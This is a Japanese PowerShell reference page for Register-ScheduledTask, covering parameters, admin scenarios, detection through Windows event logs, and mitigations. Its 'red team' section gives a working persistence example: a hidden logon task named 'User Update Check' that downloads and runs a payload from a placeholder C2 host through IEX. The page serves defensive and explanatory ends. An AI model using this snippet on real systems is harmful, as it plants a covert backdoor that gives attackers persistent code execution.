---
tags:
  - 'Register-ScheduledTask'
  - 'powershell'
  - 'cheatsheet'
title: 'Register-ScheduledTask - 新しいスケジュールされたタスクを登録する'
summary: 'タスク定義オブジェクトまたはXMLを使用して、ローカルまたはリモートコンピュータに新しいスケジュールされたタスクを登録します。'
related:
  - 'New-ScheduledTask'
  - 'New-ScheduledTaskAction'
  - 'New-ScheduledTaskTrigger'
  - 'Get-ScheduledTask'
  - 'schtasks'
---

# `Register-ScheduledTask` - 新しいスケジュールされたタスクを登録する

## 概要

`Register-ScheduledTask` コマンドレットは、ローカルまたはリモートのコンピュータに新しいスケジュールされたタスクを登録します。このコマンドレットは、CMDの `schtasks /create` よりもはるかに柔軟で強力なタスク作成機能を提供します。

`Register-ScheduledTask` の特徴は、タスクのアクション（何を実行するか）、トリガー（いつ実行するか）、プリンシパル（誰が実行するか）設定などを個別のオブジェクトとして定義しそれらを組み合わせてタスクを作成する点にあります。これにより、非常に複雑で詳細なタスクをスクリプトから作成することが可能です。

## 類似コマンドレット/コマンドとの差異

| 類似コマンドレット/コマンド | 差異 / 使い分けのポイント |
| :--- | :--- |
| **`schtasks /create` (CMD)** | `schtasks` は全てのオプションをコマンドライン引数として文字列で指定します。`Register-ScheduledTask` は、アクションやトリガーをオブジェクトとして受け取るため、複数のトリガーや複雑なアクションを持つタスクをプログラム的に作成するのが容易です。 |

## よく連携されるコマンドレット

### シナリオ例: 複数のトリガーを持つタスクを作成する (インフラ構築・運用視点)

* **目的**: 毎日午前3時に実行され、かつシステム起動時にも実行される、という2つのトリガーを持つメンテナンススクリプト用のタスクを作成する。
* **連携コマンドレット**: `New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`
* **解説**: まず `New-ScheduledTaskAction` で実行するアクション（スクリプト）を定義します。次に、`New-ScheduledTaskTrigger` を複数回呼び出して、日次トリガーと起動時トリガーの2つのトリガーオブジェクトを作成します。最後に、これらのオブジェクトを `Register-ScheduledTask` に渡してタスクを登録します。
* **コマンド例**:

    ```powershell
    # 実行するアクションを定義
    $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-NoProfile -WindowStyle Hidden -File "C:\Scripts\Maintenance.ps1"'

    # 1つ目のトリガー（毎日午前3時）を定義
    $trigger1 = New-ScheduledTaskTrigger -Daily -At 3am

    # 2つ目のトリガー（システム起動時）を定義
    $trigger2 = New-ScheduledTaskTrigger -AtStartup

    # アクションと2つのトリガーを使ってタスクを登録
    Register-ScheduledTask -TaskName "Daily and Startup Maintenance" -Action $action -Trigger $trigger1, $trigger2 -User "SYSTEM" -RunLevel Highest
    ```

## パラメータ説明

| パラメータ | 型 | 説明 |
| :--- | :--- | :--- |
| ⭐ **`-TaskName`** | `String` | 登録するタスクの名前を指定します。 |
| ⭐ **`-Action`** | `CimInstance[]` | `New-ScheduledTaskAction` で作成した、タスクが実行するアクションオブジェクトを指定します。 |
| ⭐ **`-Trigger`** | `CimInstance[]` | `New-ScheduledTaskTrigger` で作成した、タスクを開始するトリガーオブジェクトを指定します。 |
| **`-TaskPath`** | `String` | タスクを作成するタスクスケジューラのフォルダパスを指定します。 |
| ⭐ **`-User`** | `String` | タスクを実行するユーザーアカウントを指定します。`SYSTEM` や `NT AUTHORITY\LocalService` なども指定可能です。 |
| ⭐ **`-RunLevel`** | `RunLevel` | タスクの実行権限レベルを指定します (`Limited` または `Highest`)。`Highest` を指定すると、管理者権限で実行されます。 |
| **`-Description`** | `String` | タスクの説明を指定します。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: XMLファイルからタスク定義をインポートして、複数のサーバーに同じタスクを展開する。
* **組み合わせ**: `Get-Content`, `Register-ScheduledTask -Xml`
* **解説**: `Export-ScheduledTask` で既存のタスクをXMLファイルとしてエクスポートしておき、そのXMLを `Get-Content` で読み込んで `Register-ScheduledTask` の `-Xml` パラメータに渡すことで、タスクの複製が簡単に行えます。
* **例**:

    ```powershell
    # 'MyBaseTask.xml' からタスク定義を読み込んで登録
    $taskXml = Get-Content -Path "C:\Tasks\MyBaseTask.xml" | Out-String
    Register-ScheduledTask -TaskName "Cloned Task" -Xml $taskXml -User "SYSTEM"
    ```

### 2. ブルーチーム視点

* **タスク**: **不正なタスク登録の検知**。`Register-ScheduledTask` の実行履歴を監査する。
* **組み合わせ**: (PowerShellログ分析)
* **解説**: **インシデント対応の基本**。攻撃者が永続化のためにスケジュールタスクを登録することは一般的な手口です。PowerShellのスクリプトブロックロギング (イベントID 4104) や、Windows セキュリティイベントログ (イベントID 4698: スケジュールされたタスクが作成されました) を監視し、意図しない `Register-ScheduledTask` の実行やタスク作成がないかを確認します。
* **例**: -

### 3. レッドチーム視点

* **タスク**: **永続化 (Persistence)**。C2サーバーに接続するリバースシェルを、ユーザーのログオン時に実行するタスクとして登録する。
* **組み合わせ**: `New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`, `Register-ScheduledTask`
* **解説**: 攻撃者は権限昇格後、このコマンドレットを使って自身のペイロードが自動実行されるようにタスクを登録します。トリガーを「ログオン時」(`-AtLogOn`)に設定し、アクションに `powershell.exe -w hidden -c ...` のようなファイルレスのコマンドを指定することで、ユーザーがログインするたびにバックドアが起動するように仕掛けます。
* **例**:

    ```powershell
    # ユーザーログオン時にペイロードをダウンロードして実行するタスクを登録
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c 'IEX (New-Object Net.WebClient).DownloadString(''http://c2/payload.ps1'')'"
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "User Update Check" -Action $action -Trigger $trigger
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `Register-ScheduledTask : Access is denied.`
    * **考えられる原因**: スケジュールされたタスクの登録には管理者権限が必要です。
    * **解決策**: PowerShellを「管理者として実行」して、再度コマンドを実行してください。

## セキュリティに関する考慮事項

### 悪用事例

* **永続化のためのバックドア登録**: レッドチームのシナリオで述べた通り、`Register-ScheduledTask` は攻撃者がシステムへの永続的なアクセスを確保するための最も一般的で強力な手法の1つです。

### LOLBASにおける利用例

* **機能**: **永続化 (Persistence)**, **権限昇格 (Privilege Escalation)**, **コード実行 (Execution)**
* **解説**: `Register-ScheduledTask` は PowerShell の標準機能であり、`schtasks.exe` と同様に、攻撃者が環境に溶け込みながら悪意のあるタスクを登録するために利用されます（Living off the Land）。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 最小権限の原則を徹底し、一般ユーザーにタスクの作成・変更権限を与えない。
* **Detection (検知)**: Windows イベントログで、**新しいタスクの作成 (イベントID 4698)** を厳重に監視する。PowerShellのスクリプトブロックロギング (イベントID 4104) を有効化し、`Register-ScheduledTask` の実行とそのパラメータ（特に `-Action` の内容）を記録・監視する。

## 注意点・補足

* **モジュール**: このコマンドレットは `ScheduledTasks` モジュールに含まれています。これは近年のWindowsバージョンにはデフォルトでインストールされています。

---
[PowerShellインデックスに戻る](../../powershell_index.md)
